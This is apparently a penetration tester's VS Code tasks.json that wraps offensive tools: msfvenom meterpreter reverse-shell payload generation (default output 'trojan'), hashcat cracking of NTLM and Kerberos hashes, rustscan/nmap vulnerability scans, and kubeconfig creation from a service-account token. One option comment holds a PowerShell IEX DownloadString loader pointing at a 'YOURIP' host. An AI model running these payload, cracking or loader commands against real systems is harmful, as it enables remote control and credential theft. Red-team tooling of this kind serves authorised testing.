{
    "version": "2.0.0",
    "options": {
        "env": {
            "PROJECT_FOLDER": "${workspaceFolder}"
        }
    },
    "tasks": [
        {
            "label": "msfvenom payload creating",
            "type": "shell",
            "detail": "msfvenom payload creating task",
            "problemMatcher": [],
            "command": [
                "source ${workspaceFolder}/.vscode/.zshrc;",
                "msfvenom",
                "-p",
                "${input:msfvenom-payload}",
                "LHOST=${input:msfvenom-lhost}",
                "LPORT=${input:msfvenom-lport}",
                "${input:msfvenom-payload-advanced-options}",
                "-o",
                "${input:msfvenom-output}",
                "-f",
                "${input:msfvenom-format}"
            ],
            "presentation": {
                "echo": true,
                "reveal": "always",
                "focus": false,
                "panel": "new",
                "showReuseMessage": false,
                "clear": true,
                "close": false
            },
            "runOptions": {
                "runOn": "default"
            },
            "isBackground": false,
            "promptOnClose": true,
            "hide": false
        },
        {
            "label": "venv create",
            "type": "shell",
            "detail": "venv create task",
            "command": [
                "${input:python-versioned} -m venv venv;",
                "echo '*' > venv/.gitignore;"
            ],
            "problemMatcher": []
        },
        {
            "label": "edit /etc/hosts",
            "type": "shell",
            "detail": "edit /etc/hosts task",
            "command": [
                "source ${workspaceFolder}/.vscode/.zshrc;",
                "echo '================ ADDING THIS LINE IN FILE ========';",
                "dump_hosts;",
                "echo '================================================';",
                "echo 'Press Enter key to continue';",
                "read;",
                "sudo vim /etc/hosts"
            ],
            "isBackground": false,
            "problemMatcher": []
        },
        {
            "label": "service account token kubeconfig generation",
            "type": "shell",
            "detail": "Create service account based kubeconfig file",
            "command": [
                "echo 'This Task needs kubectl; make sure the kubeconfig is in your path';\n",
                "mv ~/.kube/config ~/.kube/config-back.vscode-gernerating ;\n",
                "kubectl config set-cluster localcfg --server=${input:kubeconfig-gen-api-server} --insecure-skip-tls-verify=true ;\n",
                "kubectl config set-credentials user --token ${input:kubeconfig-gen-sa-token} ;\n",
                "kubectl config set-context localcfg --cluster=localcfg --user=user --namespace=${input:kubeconfig-gen-namespace} ;\n",
                "cp ~/.kube/config ${workspaceFolder}/kubeconfig ;\n",
                "mv ~/.kube/config-back.vscode-gernerating ~/.kube/config ;\n",
                "echo ;\n",
                "echo export KUBECONFIG=${workspaceFolder}/kubeconfig ;\n",
                "cat ${workspaceFolder}/kubeconfig"
            ],
            "problemMatcher": []
        },
        {
            "label": "hashcat runner",
            "type": "shell",
            "detail": "Create and run hashcat cracking task",
            "command": [
                "source ${workspaceFolder}/.vscode/.zshrc; ",
                "hashcat",
                "--force",
                "-a ${input:hashcat-mode} ",
                "-m ${input:hashcat-hashtype} ",
                "-D ${input:hashcat-device} ",
                "${input:hashcat-hashfile}",
                "${input:hashcat-wordlist-or-masks}"
            ],
            "problemMatcher": []
        },
        {
            "label": "auto rustscan",
            "type": "shell",
            "detail": "Run rustscan with some default options",
            "command": [
                "source ${workspaceFolder}/.vscode/.zshrc; ",
                "rustscan",
                "--ulimit 5000",
                "-a ${input:scan-host}",
                "-- ${input:nmap-args}"
            ],
            "problemMatcher": []
        },
        {
            "label": "run command with selection",
            "type": "shell",
            "detail": "Run command with selection in the terminal",
            "command": [
                "source ${workspaceFolder}/.vscode/.zshrc; ",
                "echo 'Running command with selection:';",
                "echo 'Press Enter key to continue or Ctrl-C to cancal';",
                "read;",
                "${selectedText}"
            ],
            "problemMatcher": []
        }
    ],
    "inputs": [
        {
            "id": "msfvenom-payload",
            "type": "pickString",
            "description": "Select the payload",
            "options": [
                "windows/x64/meterpreter/reverse_tcp",
                "windows/meterpreter/reverse_tcp",
                "linux/x64/meterpreter/reverse_tcp",
                "linux/x86/meterpreter/reverse_tcp",
                "php/meterpreter/reverse_tcp",
                "python/meterpreter/reverse_tcp",
                "windows/meterpreter/reverse_http",
                "windows/x64/meterpreter/reverse_http",
                "windows/meterpreter/reverse_https",
                "windows/x64/meterpreter/reverse_https",
                "java/meterpreter/reverse_tcp"
            ]
        },
        {
            "id": "msfvenom-format",
            "type": "pickString",
            "description": "Select the format of the payload",
            "options": [
                "exe",
                "elf",
                "psh # psh is powershell payload with loader using `IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:80/<output>.ps1');` to load in memory ",
                "dll",
                "hta-psh",
                "psh-cmd",
                "psh-net",
                "psh-reflection",
                "elf-so",
                "exe-service",
                "raw # php python java meterpreter will meet error if you choose like php python",
                "raw | xxd -i # you can use this to get shellcode (but you need output in /dev/stdout)",
                "jsp",
                "jar",
                "war",
                "pl",
                "asp",
                "aspx",
                "msi",
                "python-reflection",
                "vba",
                "vba-exe",
                "vba-psh",
                "vbs"
            ]
        },
        {
            "id": "msfvenom-lhost",
            "type": "promptString",
            "description": "Enter the LHOST, default will read the env.zsh configurated variable $LHOST",
            "default": "$LHOST"
        },
        {
            "id": "msfvenom-lport",
            "type": "promptString",
            "description": "Enter the LPORT",
            "default": "6789"
        },
        {
            "id": "msfvenom-payload-advanced-options",
            "type": "pickString",
            "description": "Enter the advanced options",
            "default": "",
            "options": [
                "",
                "PrependMigrate=true PrependMigrateProc=explorer.exe",
                "PrependFork=true",
                "PrependSetuid=true",
                "PrependSetuid=true PrependFork=true"
            ]
        },
        {
            "id": "msfvenom-output",
            "type": "promptString",
            "description": "Enter the output filename. if you put /dev/stdout here, the output will be printed to the terminal",
            "default": "${workspaceFolder}/trojan"
        },
        {
            "id": "note-filename",
            "type": "promptString",
            "description": "Enter the note filename",
            "default": "${workspaceFolder}/note.md"
        },
        {
            "id": "kubeconfig-gen-api-server",
            "type": "promptString",
            "description": "kubernetes api server",
            "default": "https://server-ip:6443"
        },
        {
            "id": "kubeconfig-gen-sa-token",
            "type": "promptString",
            "description": "kubernetes service account token under /var/run/secrets/kubernetes.io/serviceaccount/token"
        },
        {
            "id": "kubeconfig-gen-namespace",
            "type": "promptString",
            "description": "kubernetes service account namespace",
            "default": "default"
        },
        {
            "id": "python-versioned",
            "type": "pickString",
            "description": "Python version",
            "options": [
                "python3.8",
                "python3.9",
                "python3.10",
                "python3.11",
                "python3.12",
                "python"
            ],
            "default": "python"
        },
        {
            "id": "hashcat-mode",
            "type": "pickString",
            "description": "hashcat attack mode, like wordlist mode",
            "options": [
                "$HASHCAT_MODE_WORDLIST",
                "$HASHCAT_MODE_COMBINATION",
                "$HASHCAT_MODE_TOGGLE_CASE",
                "$HASHCAT_MODE_MASK_BRUTE_FORCE",
                "$HASHCAT_MODE_WORDLIST_MASK",
                "$HASHCAT_MODE_MASK_WORDLIST"
            ],
            "default": "$HASHCAT_MODE_WORDLIST"
        },
        {
            "id": "hashcat-device",
            "type": "pickString",
            "description": "which kind of hashcat device you need",
            "options": [
                "$HASHCAT_DEVICE_CPU",
                "$HASHCAT_DEVICE_GPU",
                "$HASHCAT_DEVICE_FPGA"
            ],
            "default": "$HASHCAT_DEVICE_GPU"
        },
        {
            "id": "hashcat-hashtype",
            "type": "pickString",
            "description": "Which kind of hash u wanna crack",
            "options": [
                "$HASH_MD5",
                "$HASH_SHA1",
                "$HASH_MD5CYPT",
                "$HASH_MD4",
                "$HASH_NTLM",
                "$HASH_SHA256",
                "$HASH_APRMD5",
                "$HASH_SHA512",
                "$HASH_BCRYPT",
                "$HASH_NETNTLMv2",
                "$HASH_SHA256CRYPT",
                "$HASH_KRB5_PA_23",
                "$HASH_KRB5_PA_17",
                "$HASH_KRB5_PA_18",
                "$HASH_DJANGO_PBKDF2_SHA256",
                "$HASH_PBKDF2_HMAC_SHA256",
                "$HASH_KRB5_TGS_23",
                "$HASH_KRB5_TGS_17",
                "$HASH_KRB5_TGS_18",
                "$HASH_JWT",
                "$HASH_KRB5_AS_REP_23"
            ],
            "default": "$HASH_MD5"
        },
        {
            "id": "hashcat-hashfile",
            "type": "promptString",
            "description": "This is the file contains hash, default ${file} is the opened file in vscode",
            "default": "${file}"
        },
        {
            "id": "hashcat-wordlist-or-masks",
            "type": "promptString",
            "description": "This is the place for wordlists or your mask string",
            "default": "$ROCKYOU"
        },
        {
            "id": "scan-host",
            "type": "promptString",
            "description": "Enter the host to scan, or using default $RHOST $DOMAIN $TARGET variable u defined",
            "default": "$RHOST"
        },
        {
            "id": "nmap-args",
            "type": "promptString",
            "description": "Enter the nmap arguments, like -sS/-sV/-sC/-Pn",
            "default": "-A --script=vuln -Pn"
        }
    ]
}